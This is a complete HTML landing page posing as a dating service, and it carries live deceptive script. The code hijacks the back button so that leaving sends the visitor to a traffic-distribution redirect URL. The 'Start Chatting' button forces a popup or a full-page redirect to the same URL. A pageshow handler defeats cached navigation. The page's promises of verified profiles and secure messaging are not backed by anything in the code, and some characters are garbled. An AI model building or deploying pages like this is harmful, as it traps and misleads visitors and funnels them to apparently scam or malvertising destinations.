<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Find Your Match Today</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        
        h1 {
            color: #333;
            font-size: 32px;
            margin-bottom: 15px;
        }
        
        p {
            color: #666;
            font-size: 18px;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px 50px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .features {
            margin-top: 40px;
            text-align: left;
        }
        
        .feature {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            color: #555;
        }
        
        .feature::before {
            content: "âœ“";
            background: #667eea;
            color: white;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
            flex-shrink: 0;
        }

        .loader {
            display: none;
            margin-top: 20px;
        }

        .loader.active {
            display: block;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸ’• Find Your Perfect Match</h1>
        <p>Join thousands of singles finding love and meaningful connections every day</p>
        
        <button class="btn" id="startBtn">Start Chatting Now</button>
        
        <div class="loader" id="loader">
            <div class="spinner"></div>
        </div>
        
        <div class="features">
            <div class="feature">Verified profiles only</div>
            <div class="feature">Safe and secure messaging</div>
            <div class="feature">Match with locals near you</div>
            <div class="feature">Free to start chatting</div>
        </div>
    </div>

    <script>
        const redirectUrl = 'https://hotbjayapa.today/tds?id=1556794253&p1=sub1&p2=sub2&p3=sub3&p4=sub4';
        const chatUrl = 'https://datingland.site/chat/';
        
        // Back button redirect protection
        function setupBackButtonRedirect() {
            // Add state to history
            history.pushState(null, null, location.href);
            
            // Listen for back button
            window.addEventListener('popstate', function() {
                history.pushState(null, null, location.href);
                window.location.href = redirectUrl;
            });
        }
        
        // Initialize back button protection on load
        setupBackButtonRedirect();
        
        // Handle click redirect
        document.getElementById('startBtn').addEventListener('click', function() {
            const btn = this;
            const loader = document.getElementById('loader');
            
            // Show loading state
            btn.style.display = 'none';
            loader.classList.add('active');
            
            // Try to open in new window
            const newWindow = window.open(redirectUrl, '_blank');
            
            // Check if popup was blocked
            setTimeout(function() {
                if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
                    // Popup blocked, redirect current page
                    window.location.href = redirectUrl;
                } else {
                    // Popup opened successfully, redirect current page to chat
                    setTimeout(function() {
                        window.location.href = chatUrl;
                    }, 500);
                }
            }, 100);
        });
        
        // Prevent page from being cached
        window.addEventListener('pageshow', function(event) {
            if (event.persisted) {
                window.location.reload();
            }
        });
    </script>
</body>
</html>
